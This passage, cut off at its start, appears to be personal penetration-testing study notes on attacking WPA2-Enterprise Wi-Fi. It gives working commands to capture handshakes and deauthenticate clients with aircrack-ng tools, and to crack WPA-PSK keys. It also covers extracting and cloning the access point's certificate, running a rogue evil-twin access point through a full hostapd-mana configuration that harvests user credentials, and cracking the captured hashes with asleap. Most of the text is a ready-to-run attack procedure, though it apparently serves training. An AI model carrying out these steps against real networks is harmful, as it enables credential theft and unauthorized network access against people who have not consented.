MGT on the `airodump-ng` output.
Enables user authentication against a central database.

EAP - Extensible Authentication Protocol: framework that allows a number of different authentication schemes or methods (common use: username and password authentication).
Authentication is done using a Remote Authentication Dial-In User Service (or <font style="color:#981f3a">RADIUS server</font>). Instead of the PSK, if the authentication is successful, the result is then used as Pairwise Master Key for the 4 way handshake.

EAP-TLS is the most secure way of authentication: credentials + TLS certificates.

EAP-Tunneled-Transport-Layer-Security creates a tunnel between client and server and exchanges the credentials using one of the few possible different inner methods (also called phase 2) such as:
- Challenge-Handshake Authentication Protocol (CHAP)
- Authentication Protocol (PAP)
- Microsoft CHAP (MS-CHAP)
- Microsoft CHAP v2 (MS-CHAPv2)
- Protected Extensible Authentication Protocol (PEAP)

---

 <font style="color:#981f3a">First part: Initial Attack to get handshake</font>
1) Capture handshake.
	`# airodump-ng wlan0mon`
	Start dumping data on wpa file
	`# airodump-ng -c <channel> -w wpa --essid <essid> --bssid <bssid> wlan0mon`
	Deauthenticate a client to get the handshake
	`# aireplay-ng -0 1 -a <AP_bssid> -c <client_bssid> wlan0mon` (-0 1 to deauth only once, -a to target our bssid, -c to target the client)

OPTIONAL:
If you're cracking a WPA-PSK, you can find the password using:
`# aircrack-ng -w /usr/share/john/password.lst -e <AP_essid> -b <AP_bssid> wpa-01.cap`
To confirm the password is correct, you can run:
`# airdecap-ng -b <bssid> -e <essid> -p <password> wpa-01.cap`

------

 <font style="color:#981f3a">Second part: Attack against WPA Enterprise</font>
 
 After disabling moniotor mode with `# sudo airmon-ng stop wlan0mon`
 
2) Use Wireshark to get the certificate:
	`# wlan.bssid==<bssid> && eap && tls.handshake.certificate` <-- on the filters
	Extensible Authentication Protocol > Transport Layer Security > TLSv1.2 Record Layer: Handshake Protocol: Certificate (or something similar) > Handshake Protocol Certificate > Certificates
	There are one or more "Certificate" --> right click, export packet bytes (export as .der)
	![[Pasted image 20230202112655.png | 750]]
	`# openssl x509 -inform der -in cert.der -text` to see the certificate details
	`# openssl x509 -inform der -in cert.der -outform pem -out output.crt` to convert in pem certificate (.crt)
3) install freeradius and configure it:

change the settings of /etc/freeradius/3.0/certs/ca.cnf
```
...
[certificate_authority]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = ca@playtronics.com
commonName              = "Playtronics Certificate Authority"
...
```

then, change the settings of /etc/freeradius/3.0/certs/server.cnf
```
...
[server]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = admin@playtronics.com
commonName              = "Playtronics"
...
```

4) Rigenerate the Diffie-Hellman parameters:
	`# rm /etc/freeradius/3.0/certs/dh`
	`# cd /etc/freeradius/3.0/certs/ && make` (it can finish with an error, but we don't care)
If we run make but the certificates already exists, run  `make destroycerts` first

5) Create hostapd-mana config file with the same ssid and certificates edited:
```
# SSID of the AP
ssid=Playtronics

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1
```

Create /etc/hostapd-mana/mana.eap_user (user file)
```
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```

6) Start the AP
	`# sudo hostapd-mana /etc/hostapd-mana/mana.conf` (Use `-B` to run it in background)
When someone tries to connect to our AP, the login attempt is captured (username and hash).
There is a line on the standard output of the command that you can copy to crack the password like explained below.

7) Crack the password using `asleap` (copy it from the output of the command above):
	`# asleap -C <bssid> -R <bssid> -W wordlist`
	you can also use `crackapd` that automatically crack the intercepted hash.